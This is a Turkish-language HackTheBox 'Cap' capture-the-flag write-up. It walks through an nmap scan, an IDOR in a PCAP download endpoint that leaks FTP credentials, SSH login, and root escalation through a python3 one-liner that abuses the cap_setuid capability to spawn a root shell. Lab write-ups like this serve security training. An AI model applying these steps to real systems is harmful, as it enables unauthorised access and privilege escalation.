---
title: 'HackTheBox | Cap WriteUp'
author: appdone
categories: [HackTheBox Machines]
tags: [idor, linux capabilities]
render_with_liquid: false
media_subpath: /images/hackthebox_cap/
image:
  path: logo.webp
---

## Özet

Web uygulamasının PCAP dosyalarını indirdiğimiz alanında bir IDOR zafiyetinin olduğunu öğrenecek ve sırasıyla tüm PCAP dosyalarını indirip, inceleyeceğiz. PCAP dosyalarından birinde bulduğumuz kullanıcı bilgileri ile SSH servisine bağlanacak, daha sonra ise python dosyasının setuid yetkisinin olduğunu öğrenecek ve bu yetenekten yararlanarak yetki yükselteceğiz.

## Keşif aşaması

### Nmap taraması

```console
$ nmap -sV -sC -T4 10.10.10.245         
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
...
```

Tarama sonucunda üç adet port'un açık olduğunu ve HTTP servisinde çalışan uygulamanın bir yönetim paneli olduğunu öğreniyoruz.

### 80 numaralı port'un incelenmesi

![](1.webp){: width="1200" height="600" }

Web uygulamasında "colorlib" tarafından yapılmış, dört sayfadan oluşan bir güvenlik teması kullanılıyor. "IP Config" ve "Netword Status" sayfasında belirli komutlardan dönen sonuçlar bulunuyor.

![](2.webp){: width="1200" height="600" }

Son sayfada ise PCAP dosyalarını indirebileceğimiz bir bölüm var.

![](3.webp){: width="1200" height="600" }

## Sömürü aşaması

İndirme butonuna tıkladığımızda bizi "/download/4" sayfasına yönlendiriyor. Bu sayfada ise URL adresinde belirtilen numaraya karşılık gelen PCAP dosyasını indiriyor. Numarayı "0" olarak değiştirdikten sonra indirip, wireshark aracılığıyla görüntülediğimizde FTP servisine ait kullanıcı bilgileri ile karşılaşıyoruz.

![](4.webp){: width="1200" height="600" }

FTP servisinde bağlandıktan sonra ise nathan kullanıcısının dizininde olduğumuzu öğreniyoruz ve dizin geçişlerinin açık olduğunu görüyoruz. Haliyle aynı kullanıcı bilgilerini kullanarak SSH servisine bağlanabileceğimizi düşündüm ve bağlandıktan sonra ise ilk bayrağı almak için user.txt dosyasını görüntüledim.

```console
nathan@cap:~$ cat user.txt 
56c***1d8
```

## Yetki yükseltme

### root

Hatırlarsanız, web uygulamasında sistemde bir komut çalıştırdıktan sonra sonuçlarını doğruca ekrana yazdıran bir sayfa vardı. Uygulamanın arka planda ne yaptığını görmek için /var/www/html sayfasına gittiğimizde python'u kullanarak kullanıcı ID'sini 0 yaptığını ve komut çalıştırdığını görüyoruz.

```py
def capture():
        get_lock()
        pcapid = get_appid()
        increment_appid()
        release_lock()

        path = os.path.join(app.root_path, "upload", str(pcapid) + ".pcap")
        ip = request.remote_addr
        # permissions issues with gunicorn and threads. hacky solution for now.
        #os.setuid(0)
        #command = f"timeout 5 tcpdump -w {path} -i any host {ip}"
        command = f"""python3 -c 'import os; os.setuid(0); os.system("timeout 5 tcpdump -w {path} -i any host {ip}")'"""
        os.system(command)
        #os.setuid(1000)
                                                                                                                                                                                              
        return redirect("/data/" + str(pcapid))
```

0 ID'si root kullanıcısına ait olduğundan root yetkisinde komut çalıştırdığını düşünebiliriz. Bunu yapabilmesi için python dosyasına setuid yeteneğinin verilmesi gerekiyor. Kontrol ettiğimizde setuid yeteneğinin olduğunu görüyoruz.

```console
nathan@cap:/var/www/html$ getcap /usr/bin/python3.8
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

Aynı komutun sadece komut çalıştıracağımız alanını değiştirdikten sonra çalıştırdığımızda root kullanıcısına geçiş yapıyor ve son bayrağı kendi dizininden alıyoruz.

```console
nathan@cap:/var/www/html$ python3 -c 'import os; os.setuid(0);os.system("bash")'
root@cap:/var/www/html# cd /root
root@cap:/root# ls
root.txt  snap
root@cap:/root# cat root.txt 
857***bad
```
